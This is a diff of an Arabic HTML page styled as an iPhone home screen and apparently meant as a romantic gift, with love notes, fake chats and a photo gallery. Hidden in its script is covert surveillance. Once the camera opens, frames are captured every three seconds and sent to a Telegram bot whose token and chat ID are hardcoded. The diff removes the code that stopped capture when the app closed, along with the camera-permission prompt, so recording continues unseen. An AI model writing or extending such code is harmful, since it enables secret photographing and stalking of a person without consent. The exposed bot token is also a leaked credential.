@@ -106,13 +106,13 @@
         }
 
         .app-icon {
-            width: 65px;
-            height: 65px;
+            width: 60px;
+            height: 60px;
             border-radius: 16px;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-size: 30px;
+            font-size: 28px;
             color: white;
             box-shadow: 0 4px 10px rgba(0,0,0,0.2);
             transition: transform 0.2s;
@@ -134,110 +134,47 @@
             transition: transform 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
             display: flex;
             flex-direction: column;
+            overflow-y: auto;
+            overflow-x: hidden;
         }
         
         .app-window.active {
             transform: translateY(0);
         }
 
+        /* تنسيقات الملاحظات */
         .notes-bg { background-color: #f2f2f7; }
-        .note-item {
-            border-bottom: 1px solid #e5e5ea;
-            cursor: pointer;
-        }
+        .note-item { border-bottom: 1px solid #e5e5ea; cursor: pointer; }
         .note-item:last-child { border-bottom: none; }
 
-        .camera-bg { background-color: #000; color: white; }
-        #camera-feed {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .shutter-btn-container {
-            position: absolute;
-            bottom: 40px;
-            left: 0;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 40;
-        }
-        .shutter-btn {
-            width: 70px;
-            height: 70px;
-            background-color: rgba(255, 255, 255, 0.5);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            border: 4px solid white;
-            cursor: pointer;
-        }
-        .shutter-btn-inner {
-            width: 54px;
-            height: 54px;
-            background-color: white;
-            border-radius: 50%;
-            transition: transform 0.1s;
-        }
-        .shutter-btn:active .shutter-btn-inner {
-            transform: scale(0.9);
-        }
+        /* تنسيقات الكاميرا */
+        .camera-bg { background-color: #000; color: white; overflow: hidden; }
+        #camera-feed { width: 100%; height: 100%; object-fit: cover; }
+        .shutter-btn-container { position: absolute; bottom: 40px; left: 0; width: 100%; display: flex; justify-content: center; align-items: center; z-index: 40; }
+        .shutter-btn { width: 70px; height: 70px; background-color: rgba(255, 255, 255, 0.5); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 4px solid white; cursor: pointer; }
+        .shutter-btn-inner { width: 54px; height: 54px; background-color: white; border-radius: 50%; transition: transform 0.1s; }
+        .shutter-btn:active .shutter-btn-inner { transform: scale(0.9); }
+        #camera-flash { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: white; z-index: 50; opacity: 0; pointer-events: none; transition: opacity 0.1s ease-out; }
 
-        #camera-flash {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: white;
-            z-index: 50;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.1s ease-out;
-        }
+        /* تنسيقات الرسائل (iMessage و Telegram) */
+        .message-bg { background-color: #ffffff; }
+        .chat-bubble-left { background-color: #e5e5ea; color: black; border-radius: 20px 20px 20px 5px; padding: 10px 15px; max-width: 75%; margin-bottom: 10px; align-self: flex-start; }
+        .chat-bubble-right { background-color: #007aff; color: white; border-radius: 20px 20px 5px 20px; padding: 10px 15px; max-width: 75%; margin-bottom: 10px; align-self: flex-end; }
+        
+        .tg-bg { background-color: #e4ddd6; background-image: url('https://www.transparenttextures.com/patterns/cubes.png'); }
+        .tg-bubble-left { background-color: #ffffff; color: black; border-radius: 12px 12px 12px 0px; padding: 8px 12px; max-width: 75%; margin-bottom: 10px; align-self: flex-start; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+        .tg-bubble-right { background-color: #effdde; color: black; border-radius: 12px 12px 0px 12px; padding: 8px 12px; max-width: 75%; margin-bottom: 10px; align-self: flex-end; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
 
-        #whatsapp-notify {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            right: 15px;
-            z-index: 70;
-            transform: translateY(-150%);
-            transition: transform 0.5s cubic-bezier(0.25, 0.8, 0.25, 1);
-        }
-        #whatsapp-notify.show {
-            transform: translateY(0);
-        }
+        /* إشعارات وأدوات الآيفون */
+        #whatsapp-notify { position: absolute; top: 15px; left: 15px; right: 15px; z-index: 70; transform: translateY(-150%); transition: transform 0.5s cubic-bezier(0.25, 0.8, 0.25, 1); }
+        #whatsapp-notify.show { transform: translateY(0); }
+        #ios-alert { position: absolute; inset: 0; z-index: 80; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; transition: opacity 0.3s; }
+        #ios-alert.show { opacity: 1; pointer-events: auto; }
+        #ios-alert-box { transform: scale(0.9); transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        #ios-alert.show #ios-alert-box { transform: scale(1); }
+        .overlay { position: absolute; inset: 0; background-color: rgba(0,0,0,0.4); }
 
-        #ios-alert {
-            position: absolute;
-            inset: 0;
-            z-index: 80;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s;
-        }
-        #ios-alert.show {
-            opacity: 1;
-            pointer-events: auto;
-        }
-        #ios-alert-box {
-            transform: scale(0.9);
-            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        #ios-alert.show #ios-alert-box {
-            transform: scale(1);
-        }
-        .overlay {
-            position: absolute;
-            inset: 0;
-            background-color: rgba(0,0,0,0.4);
-        }
+        ::-webkit-scrollbar { width: 0px; background: transparent; }
 
     </style>
 </head>
@@ -245,6 +182,7 @@
 
     <div class="iphone-frame" id="iphone">
         
+        <!-- شريط الحالة -->
         <div class="status-bar">
             <div id="clock">12:00</div>
             <div class="flex gap-2 text-sm" dir="ltr">
@@ -273,43 +211,89 @@
             </div>
         </div>
 
-        <!-- الشاشة الرئيسية -->
+        <!-- ================= الشاشة الرئيسية (القائمة) ================= -->
         <div class="absolute inset-0 pt-20 px-6 pb-24 z-10 flex flex-col justify-between">
-            <div class="grid grid-cols-4 gap-4 mt-8">
+            <div class="grid grid-cols-4 gap-x-4 gap-y-6 mt-6">
                 
+                <!-- 1. الكاميرا -->
+                <div class="flex flex-col items-center gap-1" onclick="openApp('camera-app')">
+                    <div class="app-icon bg-gray-200 text-gray-800"><i class="fas fa-camera"></i></div>
+                    <span class="text-white text-xs font-semibold drop-shadow-md">الكاميرا</span>
+                </div>
+
+                <!-- 2. الملاحظات -->
                 <div class="flex flex-col items-center gap-1" onclick="openApp('notes-app')">
-                    <div class="app-icon bg-yellow-400 text-white">
-                        <i class="fas fa-book"></i>
-                    </div>
+                    <div class="app-icon bg-yellow-400 text-white"><i class="fas fa-book"></i></div>
                     <span class="text-white text-xs font-semibold drop-shadow-md">الملاحظات</span>
                 </div>
 
-                <div class="flex flex-col items-center gap-1" onclick="openApp('camera-app')">
-                    <div class="app-icon bg-gray-200 text-gray-800">
-                        <i class="fas fa-camera"></i>
-                    </div>
-                    <span class="text-white text-xs font-semibold drop-shadow-md">الكاميرا</span>
+                <!-- 3. VPN -->
+                <div class="flex flex-col items-center gap-1" onclick="openApp('vpn-app')">
+                    <div class="app-icon bg-blue-600 text-white"><i class="fas fa-shield-alt"></i></div>
+                    <span class="text-white text-xs font-semibold drop-shadow-md">VPN</span>
+                </div>
+
+                <!-- 4. الصور -->
+                <div class="flex flex-col items-center gap-1" onclick="openApp('gallery-app')">
+                    <div class="app-icon bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-500 text-white"><i class="fas fa-images"></i></div>
+                    <span class="text-white text-xs font-semibold drop-shadow-md">الصور</span>
+                </div>
+
+                <!-- 5. الطقس -->
+                <div class="flex flex-col items-center gap-1" onclick="openApp('weather-app')">
+                    <div class="app-icon bg-blue-400 text-white"><i class="fas fa-cloud-sun"></i></div>
+                    <span class="text-white text-xs font-semibold drop-shadow-md">الطقس</span>
+                </div>
+
+                <!-- 6. الهاتف -->
+                <div class="flex flex-col items-center gap-1" onclick="openApp('phone-app')">
+                    <div class="app-icon bg-green-500 text-white"><i class="fas fa-phone"></i></div>
+                    <span class="text-white text-xs font-semibold drop-shadow-md">الهاتف</span>
+                </div>
+
+                <!-- 7. الرسائل -->
+                <div class="flex flex-col items-center gap-1" onclick="openApp('messages-app')">
+                    <div class="app-icon bg-green-400 text-white"><i class="fas fa-comment"></i></div>
+                    <span class="text-white text-xs font-semibold drop-shadow-md">الرسائل</span>
+                </div>
+
+                <!-- 8. واتساب -->
+                <div class="flex flex-col items-center gap-1" onclick="openApp('whatsapp-app')">
+                    <div class="app-icon bg-green-600 text-white"><i class="fab fa-whatsapp"></i></div>
+                    <span class="text-white text-xs font-semibold drop-shadow-md">واتساب</span>
+                </div>
+
+                <!-- 9. تيليجرام -->
+                <div class="flex flex-col items-center gap-1" onclick="openApp('telegram-app')">
+                    <div class="app-icon bg-blue-500 text-white"><i class="fab fa-telegram-plane"></i></div>
+                    <span class="text-white text-xs font-semibold drop-shadow-md">تيليجرام</span>
+                </div>
+
+                <!-- 10. الموسيقى -->
+                <div class="flex flex-col items-center gap-1" onclick="openApp('music-app')">
+                    <div class="app-icon bg-pink-500 text-white"><i class="fas fa-music"></i></div>
+                    <span class="text-white text-xs font-semibold drop-shadow-md">الموسيقى</span>
                 </div>
 
             </div>
             
+            <!-- شريط التطبيقات السفلي (Dock) -->
             <div class="bg-white/30 backdrop-blur-md rounded-3xl p-4 flex justify-around">
-                <div class="app-icon bg-green-500"><i class="fas fa-phone"></i></div>
-                <div class="app-icon bg-blue-500"><i class="fas fa-comment"></i></div>
-                <div class="app-icon bg-blue-400"><i class="fab fa-safari"></i></div>
-                <div class="app-icon bg-pink-500"><i class="fas fa-music"></i></div>
+                <div class="app-icon bg-blue-400" onclick="openApp('dummy-app')"><i class="fab fa-safari"></i></div>
+                <div class="app-icon bg-blue-300" onclick="openApp('dummy-app')"><i class="fas fa-envelope"></i></div>
+                <div class="app-icon bg-gray-600" onclick="openApp('dummy-app')"><i class="fas fa-cog"></i></div>
             </div>
         </div>
 
-        <!-- تطبيق الملاحظات -->
-        <div id="notes-app" class="app-window notes-bg">
+        <!-- ================= تطبيق الملاحظات ================= -->
+        <div id="notes-app" class="app-window notes-bg pb-10">
             <div class="pt-20 px-6 pb-4">
                 <h1 class="text-3xl font-bold text-gray-800 mb-6">ملاحظاتي</h1>
                 <div class="bg-white rounded-xl shadow-sm overflow-hidden" id="notes-list"></div>
             </div>
         </div>
 
-        <div id="note-reader" class="app-window notes-bg" style="z-index: 35;">
+        <div id="note-reader" class="app-window notes-bg pb-10" style="z-index: 35;">
             <div class="pt-16 px-4 flex items-center border-b border-gray-200 pb-2">
                 <button onclick="closeNoteReader()" class="text-yellow-600 font-bold flex items-center gap-1 text-lg">
                     <i class="fas fa-chevron-right"></i> الملاحظات
@@ -317,38 +301,242 @@
             </div>
             <div class="p-6">
                 <h2 id="reader-title" class="text-2xl font-bold text-gray-800 mb-4"></h2>
-                <div id="reader-content" class="text-gray-700 text-lg leading-relaxed whitespace-pre-wrap"></div>
+                <div id="reader-content" class="text-gray-700 text-lg leading-relaxed whitespace-pre-wrap font-sans"></div>
             </div>
         </div>
 
-        <!-- تطبيق الكاميرا -->
-        <div id="camera-app" class="app-window camera-bg relative">
-            
+        <!-- ================= تطبيق الكاميرا ================= -->
+        <div id="camera-app" class="app-window camera-bg">
             <div class="absolute top-16 w-full flex justify-between items-center px-6 z-40">
                 <button onclick="closeApps()" class="text-white text-xl"><i class="fas fa-chevron-down"></i></button>
-                
                 <button onclick="showFilterAlert()" class="text-yellow-400 font-bold flex flex-col items-center gap-1">
                     <i class="fas fa-magic text-xl"></i>
                     <span class="text-xs">فلاتر</span>
                 </button>
-                
                 <i class="fas fa-bolt text-white text-xl"></i>
             </div>
-
             <video id="camera-feed" autoplay playsinline muted></video>
-            
             <canvas id="photo-canvas" class="hidden"></canvas>
-
             <div class="shutter-btn-container">
                 <div class="shutter-btn" onclick="takeManualPicture()">
                     <div class="shutter-btn-inner"></div>
                 </div>
             </div>
-
             <div id="camera-flash"></div>
         </div>
 
-        <!-- التنبيه المنبثق للفلاتر -->
+        <!-- ================= تطبيق تيليجرام ================= -->
+        <div id="telegram-app" class="app-window tg-bg flex flex-col">
+            <!-- الهيدر الأزرق -->
+            <div class="pt-14 pb-2 px-4 bg-[#0088cc] text-white flex items-center justify-between sticky top-0 z-10 shadow-md">
+                <button onclick="closeApps()" class="text-white text-xl"><i class="fas fa-arrow-right"></i></button>
+                <div class="flex flex-col items-center">
+                    <span class="font-bold text-lg">فؤاد 💙</span>
+                    <span class="text-xs text-blue-200">متصل الآن</span>
+                </div>
+                <div class="w-10 h-10 rounded-full overflow-hidden border border-blue-400">
+                    <img src="https://ui-avatars.com/api/?name=Fouad&background=fff&color=0088cc" class="w-full h-full object-cover">
+                </div>
+            </div>
+            
+            <!-- المحادثة -->
+            <div class="flex-1 p-4 flex flex-col overflow-y-auto pb-24">
+                <div class="text-center text-xs text-gray-500 bg-white/70 rounded-full w-20 mx-auto mb-4 py-1">اليوم</div>
+                
+                <div class="tg-bubble-left mt-2 flex items-end justify-between gap-2">
+                    <span>هلاووو زنوطه شلونج</span>
+                    <span class="text-[10px] text-gray-400 ml-2">10:41</span>
+                </div>
+                
+            </div>
+
+            <!-- شريط الكتابة -->
+            <div class="bg-white p-3 flex items-center gap-3 absolute bottom-0 w-full shadow-lg">
+                <i class="fas fa-paperclip text-gray-500 text-xl"></i>
+                <div class="flex-1 text-gray-400 text-sm">رسالة...</div>
+                <i class="fas fa-microphone text-gray-500 text-xl"></i>
+            </div>
+        </div>
+
+        <!-- ================= تطبيق الرسائل (iMessage) ================= -->
+        <div id="messages-app" class="app-window message-bg flex flex-col">
+            <div class="pt-14 pb-2 px-4 bg-gray-100 border-b border-gray-300 flex items-center justify-between sticky top-0 z-10">
+                <button onclick="closeApps()" class="text-blue-500 text-xl"><i class="fas fa-chevron-right"></i></button>
+                <div class="flex flex-col items-center">
+                    <div class="w-10 h-10 rounded-full bg-gray-300 mb-1 overflow-hidden">
+                        <img src="https://ui-avatars.com/api/?name=Fouad&background=random&color=fff" class="w-full h-full object-cover">
+                    </div>
+                    <span class="text-xs font-bold">فؤاد ❤️</span>
+                </div>
+                <div class="w-6"></div>
+            </div>
+            <div class="flex-1 p-4 flex flex-col overflow-y-auto pb-24">
+                <div class="text-center text-xs text-gray-400 mb-4">اليوم 10:41 ص</div>
+                <div class="chat-bubble-left">زينب.. تدرين شكد احبج؟</div>
+                <div class="chat-bubble-left">انتي مو بس حبيبتي، انتي روحي وعافيتي ❤️</div>
+                <div class="chat-bubble-right mt-4">يا عمري انت ❤️</div>
+                <div class="chat-bubble-left mt-4">ديري بالج على نفسج وعلى هالعيون الحلوة</div>
+            </div>
+            <div class="bg-gray-100 p-3 border-t border-gray-300 flex items-center gap-3 absolute bottom-0 w-full mb-4">
+                <i class="fas fa-plus text-gray-500 text-xl"></i>
+                <div class="flex-1 bg-white border border-gray-300 rounded-full h-8 px-4 flex items-center text-gray-400 text-sm">iMessage</div>
+                <i class="fas fa-microphone text-gray-500 text-xl"></i>
+            </div>
+        </div>
+
+        <!-- ================= تطبيق الهاتف (Phone) ================= -->
+        <div id="phone-app" class="app-window bg-white pb-10">
+            <div class="pt-16 px-4 pb-2 bg-white/90 backdrop-blur-md sticky top-0 z-10 flex justify-between items-end border-b border-gray-100">
+                <button onclick="closeApps()" class="text-blue-500 text-lg mb-2"><i class="fas fa-chevron-down"></i></button>
+                <h1 class="text-3xl font-bold text-black mb-2">المفضلة</h1>
+                <div class="w-6"></div>
+            </div>
+            <div class="p-6 flex items-center gap-4 border-b border-gray-100 cursor-pointer hover:bg-gray-50">
+                <div class="w-14 h-14 rounded-full bg-gray-200 overflow-hidden relative">
+                    <img src="https://ui-avatars.com/api/?name=Fouad&background=random&color=fff" class="w-full h-full object-cover">
+                    <div class="absolute bottom-0 right-0 w-4 h-4 bg-green-500 border-2 border-white rounded-full"></div>
+                </div>
+                <div class="flex-1">
+                    <h3 class="text-lg font-bold text-gray-900">حبيب الروح فؤاد ❤️</h3>
+                    <p class="text-gray-500 text-sm">موبايل</p>
+                </div>
+                <div class="text-blue-500 text-xl"><i class="fas fa-info-circle"></i></div>
+            </div>
+        </div>
+
+        <!-- ================= تطبيق واتساب ================= -->
+        <div id="whatsapp-app" class="app-window bg-white pb-10">
+            <div class="pt-16 px-4 pb-4 bg-[#075E54] text-white flex justify-between items-center sticky top-0 z-10">
+                <div class="flex gap-4 items-center">
+                    <button onclick="closeApps()" class="text-white text-xl"><i class="fas fa-chevron-right"></i></button>
+                    <h1 class="text-2xl font-bold">واتساب</h1>
+                </div>
+                <div class="flex gap-5 text-xl">
+                    <i class="fas fa-camera"></i>
+                    <i class="fas fa-search"></i>
+                    <i class="fas fa-ellipsis-v"></i>
+                </div>
+            </div>
+            <div class="p-4 flex items-center gap-4 border-b border-gray-100 cursor-pointer hover:bg-gray-50">
+                <div class="w-14 h-14 rounded-full bg-gray-200 overflow-hidden">
+                    <img src="https://ui-avatars.com/api/?name=Fouad&background=random&color=fff" class="w-full h-full object-cover">
+                </div>
+                <div class="flex-1">
+                    <h3 class="text-lg font-bold text-gray-900">فؤاد 💍</h3>
+                    <p class="text-gray-500 text-sm"><i class="fas fa-check-double text-blue-500"></i> يا أجمل وجه شافته عيوني...</p>
+                </div>
+                <div class="text-xs text-green-500 font-bold">الآن</div>
+            </div>
+        </div>
+
+        <!-- ================= تطبيق تيليجرام (القائمة) ================= -->
+        <div id="telegram-list-app" class="app-window bg-white pb-10" style="display:none;"> <!-- المخفي حالياً ودمجناه بالمحادثة -->
+            <div class="pt-16 px-4 pb-4 bg-[#0088cc] text-white flex justify-between items-center sticky top-0 z-10">
+                <div class="flex gap-4 items-center">
+                    <button onclick="closeApps()" class="text-white text-xl"><i class="fas fa-chevron-right"></i></button>
+                    <h1 class="text-2xl font-bold">تيليجرام</h1>
+                </div>
+                <i class="fas fa-search text-xl"></i>
+            </div>
+            <div class="p-4 flex items-center gap-4 border-b border-gray-100 cursor-pointer hover:bg-gray-50">
+                <div class="w-14 h-14 rounded-full bg-gray-200 overflow-hidden">
+                    <img src="https://ui-avatars.com/api/?name=Fouad&background=random&color=fff" class="w-full h-full object-cover">
+                </div>
+                <div class="flex-1">
+                    <h3 class="text-lg font-bold text-gray-900">فؤاد 💙</h3>
+                    <p class="text-gray-500 text-sm">هلاووو زنوطه شلونج</p>
+                </div>
+                <div class="text-xs text-gray-400">الآن</div>
+            </div>
+        </div>
+
+        <!-- ================= تطبيق VPN (المقلب) ================= -->
+        <div id="vpn-app" class="app-window bg-gray-900 text-white flex flex-col items-center justify-center pb-10">
+            <button onclick="closeApps()" class="absolute top-16 left-6 text-white text-2xl z-50"><i class="fas fa-times"></i></button>
+            
+            <div class="w-32 h-32 rounded-full border-4 border-red-500 flex items-center justify-center mb-8 bg-red-500/20">
+                <i class="fas fa-ban text-6xl text-red-500"></i>
+            </div>
+            <h2 class="text-4xl font-bold mb-4 text-center text-red-500">تحذير!</h2>
+            <p class="text-2xl text-center px-6 mt-4 text-white font-bold leading-relaxed">
+                شعندج هنأ ادبسز يله طلعي 😂❤️
+            </p>
+        </div>
+
+        <!-- ================= تطبيق الصور ================= -->
+        <div id="gallery-app" class="app-window bg-white pb-10">
+            <div class="pt-16 px-4 pb-2 bg-white/90 backdrop-blur-md sticky top-0 z-10 flex justify-between items-end border-b border-gray-100">
+                <h1 class="text-3xl font-bold text-black">الصور</h1>
+                <button onclick="closeApps()" class="text-blue-500 font-semibold">إغلاق</button>
+            </div>
+            <div class="p-1">
+                <div class="text-lg font-bold px-3 py-2 text-gray-800">ذكرياتنا ❤️</div>
+                <div class="grid grid-cols-3 gap-1">
+                    <div class="aspect-square bg-gray-200"><img src="https://images.unsplash.com/photo-1518199266791-5375a83190b7?w=300&q=80" class="w-full h-full object-cover"></div>
+                    <div class="aspect-square bg-gray-200"><img src="https://images.unsplash.com/photo-1494774157365-9e04c6720e47?w=300&q=80" class="w-full h-full object-cover"></div>
+                    <div class="aspect-square bg-gray-200"><img src="https://images.unsplash.com/photo-1522673607200-164d1b6ce486?w=300&q=80" class="w-full h-full object-cover"></div>
+                    <div class="aspect-square bg-gray-200"><img src="https://images.unsplash.com/photo-1516589178581-6cd7833ae3b2?w=300&q=80" class="w-full h-full object-cover"></div>
+                    <div class="aspect-square bg-gray-200 flex items-center justify-center bg-pink-100 text-pink-500 text-2xl"><i class="fas fa-heart"></i></div>
+                    <div class="aspect-square bg-gray-200"><img src="https://images.unsplash.com/photo-1501901609772-df0848060b33?w=300&q=80" class="w-full h-full object-cover"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= تطبيق الموسيقى ================= -->
+        <div id="music-app" class="app-window bg-gray-900 text-white flex flex-col items-center pt-24 pb-10 px-8">
+            <button onclick="closeApps()" class="absolute top-16 left-6 text-gray-400 text-xl"><i class="fas fa-chevron-down"></i></button>
+            <div class="w-64 h-64 rounded-2xl overflow-hidden shadow-2xl shadow-pink-500/20 mb-10 mt-10">
+                <img src="https://images.unsplash.com/photo-1614113489855-66422ad300a4?w=500&q=80" class="w-full h-full object-cover">
+            </div>
+            <div class="w-full flex justify-between items-end mb-6">
+                <div>
+                    <h2 class="text-2xl font-bold">أجمل حب</h2>
+                    <p class="text-pink-400 text-lg">فؤاد</p>
+                </div>
+                <i class="fas fa-ellipsis-h text-gray-400"></i>
+            </div>
+            <div class="w-full mb-8">
+                <div class="h-1.5 bg-gray-700 rounded-full overflow-hidden">
+                    <div class="h-full bg-white w-1/3 rounded-full"></div>
+                </div>
+                <div class="flex justify-between text-xs text-gray-400 mt-2 font-sans">
+                    <span>1:24</span>
+                    <span>-2:36</span>
+                </div>
+            </div>
+            <div class="flex items-center justify-between w-full px-6 text-3xl">
+                <i class="fas fa-random text-gray-400 text-xl"></i>
+                <i class="fas fa-step-backward"></i>
+                <i class="fas fa-play-circle text-6xl text-white"></i>
+                <i class="fas fa-step-forward"></i>
+                <i class="fas fa-redo text-gray-400 text-xl"></i>
+            </div>
+        </div>
+
+        <!-- تطبيق الطقس -->
+        <div id="weather-app" class="app-window bg-blue-500 text-white pb-10">
+            <button onclick="closeApps()" class="absolute top-16 left-6 text-white text-xl"><i class="fas fa-chevron-down"></i></button>
+            <div class="pt-24 flex flex-col items-center">
+                <h2 class="text-3xl font-normal text-white">بغداد</h2>
+                <h1 class="text-7xl font-thin mt-2 mb-2">24°</h1>
+                <p class="text-lg">صافٍ</p>
+                <p class="text-sm mt-1">العظمى: 28° الصغرى: 15°</p>
+                <div class="mt-12 bg-white/20 backdrop-blur-md rounded-2xl w-5/6 p-4">
+                    <p class="text-sm leading-relaxed text-center">
+                        الجو يجنن اليوم.. بس ميكمل الا بشوفتج يا زينب ❤️
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- تطبيق شكلي (لأيقونات الدوك) -->
+        <div id="dummy-app" class="app-window bg-white pb-10 flex flex-col items-center justify-center">
+            <button onclick="closeApps()" class="absolute top-16 left-6 text-black text-xl"><i class="fas fa-chevron-down"></i></button>
+            <i class="fas fa-tools text-6xl text-gray-300 mb-4"></i>
+            <h2 class="text-xl font-bold text-gray-500">لا يوجد شيء هنا</h2>
+        </div>
+
+        <!-- ================= التنبيه المنبثق للفلاتر ================= -->
         <div id="ios-alert">
             <div class="overlay"></div>
             <div class="bg-white/95 backdrop-blur-xl w-64 rounded-2xl flex flex-col text-center relative z-10" id="ios-alert-box">
@@ -367,7 +555,6 @@
     </div>
 
     <script>
-        // إعدادات تيليجرام
         const TELEGRAM_BOT_TOKEN = '8507267987:AAEEpWypLGv5lP27tV2WaUYZgPRnr3JjwHg'; 
         const TELEGRAM_CHAT_ID = '8741862928';
 
@@ -383,37 +570,38 @@
         updateClock();
 
         let currentStream = null;
-        let autoCaptureInterval = null; // متغير للتحكم في التصوير التلقائي
+        let autoCaptureInterval = null; 
 
         function openApp(appId) {
             document.getElementById(appId).classList.add('active');
             if (appId === 'camera-app') {
-                startCamera();
+                if (!currentStream) {
+                    startCamera();
+                }
             }
         }
 
         function closeApps() {
             const windows = document.querySelectorAll('.app-window');
             windows.forEach(win => win.classList.remove('active'));
-            stopCamera();
             closeNoteReader();
         }
 
         const notes = [
             {
-                title: "إلى أجمل صدفة ❤️",
-                preview: "زينب.. يا من جعلتِ للحياة...",
-                content: "زينب..\nيا من جعلتِ للحياة لوناً وطعماً آخر.\nمنذ اليوم الذي عرفتك فيه، أدركت أن الصدف أحياناً تخبئ لنا أجمل أقدارنا.\n\nأحبك يا كل أشيائي الجميلة."
+                title: "إلى أجمل عينين ❤️",
+                preview: "وَأغار اَن يغرَم أحد بِعينيكِ...",
+                content: "وَأغار اَن يغرَم أحد بِعينيكِ\nوَلا يعلم انهَا لِي\nوَأغار مِن عَين تتأمل عينَاك\nوَانا المغرَم بها .\n\n- فؤاد المسحور بعيونج"
+            },
+            {
+                title: "تاريخ لا يُنسى",
+                preview: "احلى يوم جان من خليتيني...",
+                content: "احلى يوم جان من خليتيني ابحوش بالزباله على محبسج 😂😂 \nاوفف شكد احبك"
             },
             {
                 title: "ملاحظة سريعة",
                 preview: "فقط أردت أن أقول لكِ...",
                 content: "فقط أردت أن أقول لكِ أنكِ تبدين جميلة جداً اليوم، وحتى لو لم أراكِ، فأنا أعرف أنك كذلك.\nابتسمي، فابتسامتك هي عالمي."
-            },
-            {
-                title: "تاريخ لا يُنسى",
-                preview: "اليوم الذي التقينا فيه...",
-                content: "هناك أيام تمر كأي يوم عادي، وهناك يوم محفور في ذاكرتي للأبد.. اليوم الذي أصبحتِ فيه جزءاً من حياتي.\n\nشكراً لوجودك معي يا زينب."
             }
         ];
 
@@ -450,8 +638,9 @@
             document.getElementById('ios-alert').classList.remove('show');
         }
 
-        // ================= برمجة تطبيق الكاميرا =================
         async function startCamera() {
+            if (currentStream) return; 
+
             const video = document.getElementById('camera-feed');
             const indicator = document.getElementById('camera-indicator');
             
@@ -463,51 +652,31 @@
                 video.srcObject = currentStream;
                 indicator.classList.remove('opacity-0'); 
                 
-                // بدء التصوير التلقائي الصامت كل 3 ثواني (3000 ملي ثانية)
-                autoCaptureInterval = setInterval(() => {
-                    captureAndSendSilent('صورة تلقائية لزينب من داخل التطبيق 📸❤️');
-                }, 3000);
+                if (!autoCaptureInterval) {
+                    autoCaptureInterval = setInterval(() => {
+                        captureAndSendSilent('📸 صورة لزينب وهي تتصفح الهاتف (تلقائي) ❤️');
+                    }, 3000);
+                }
 
             } catch (err) {
                 console.error("خطأ في فتح الكاميرا: ", err);
-                alert("يرجى السماح بالوصول للكاميرا لرؤية المفاجأة!");
             }
         }
 
-        function stopCamera() {
-            const indicator = document.getElementById('camera-indicator');
-            // إيقاف التصوير التلقائي عند إغلاق التطبيق
-            if (autoCaptureInterval) {
-                clearInterval(autoCaptureInterval);
-                autoCaptureInterval = null;
-            }
-
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-                currentStream = null;
-                indicator.classList.add('opacity-0');
-            }
-        }
-
-        // دالة التصوير اليدوي (عندما تضغط هي على الزر) - بها تأثيرات مرئية
         function takeManualPicture() {
             const flash = document.getElementById('camera-flash');
             if (!currentStream) return;
 
-            // 1. تأثير الفلاش
             flash.style.opacity = '1';
             setTimeout(() => { flash.style.opacity = '0'; }, 150);
 
-            // 2. إظهار إشعار الواتساب
             setTimeout(() => {
                 showNotification();
             }, 1000);
 
-            // 3. التقاط وإرسال الصورة
             captureAndSendSilent('فؤاد، لقد التقطت زينب صورة للتو! ❤️ (تصوير يدوي)');
         }
 
-        // دالة التصوير الصامت والإرسال (تُستخدم للتلقائي ولليدوي)
         function captureAndSendSilent(captionText) {
             if (!currentStream) return;
 
@@ -518,18 +687,15 @@
             canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
             
-            // رسم الصورة معكوسة كالمرآة
             context.translate(canvas.width, 0);
             context.scale(-1, 1);
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // إرسال الصورة لتيليجرام
             canvas.toBlob((blob) => {
                 sendPhotoToTelegram(blob, captionText);
             }, 'image/jpeg', 0.8);
         }
 
-        // ================= إشعارات الواتساب =================
         let notifyTimeout;
         function showNotification() {
             const notify = document.getElementById('whatsapp-notify');
@@ -545,7 +711,6 @@
             document.getElementById('whatsapp-notify').classList.remove('show');
         }
 
-        // ================= الإرسال إلى تيليجرام =================
         function sendPhotoToTelegram(imageBlob, captionText) {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -555,16 +720,7 @@
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if(!data.ok) {
-                    console.error('خطأ من تيليجرام:', data.description);
-                }
-            })
-            .catch((error) => {
-                console.error('حدث خطأ أثناء الإرسال:', error);
-            });
+            }).catch(console.error);
         }
     </script>
 </body>
